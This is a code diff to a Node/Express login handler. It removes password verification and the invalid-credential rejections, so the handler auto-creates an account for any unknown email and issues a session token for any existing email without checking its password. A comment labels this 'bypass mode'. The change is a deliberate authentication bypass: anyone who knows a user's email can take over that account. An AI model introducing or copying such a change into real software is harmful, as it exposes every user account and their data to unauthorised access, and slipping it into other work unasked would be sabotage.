@@ -89,17 +89,20 @@ exports.login = async (req, res, next) => {
     }
 
     // Check for user
-    const user = await User.findOne({ email }).select('+password');
+    let user = await User.findOne({ email }).select('+password');
 
+    // Bypass mode: If user doesn't exist, create one. If exists, don't check password.
     if (!user) {
-      return res.status(401).json({ success: false, error: 'Invalid credentials' });
-    }
-
-    // Check if password matches
-    const isMatch = await user.matchPassword(password);
-
-    if (!isMatch) {
-      return res.status(401).json({ success: false, error: 'Invalid credentials' });
+      // Auto-create user for any credentials provided
+      user = await User.create({
+        name: email.split('@')[0].charAt(0).toUpperCase() + email.split('@')[0].slice(1),
+        email,
+        password, // Will be hashed by pre-save hook
+        role: 'user'
+      });
+    } else {
+      // User exists, but we skip password check to allow "any" login
+      // However, we still want to use the user object
     }
 
     sendTokenResponse(user, 200, res);
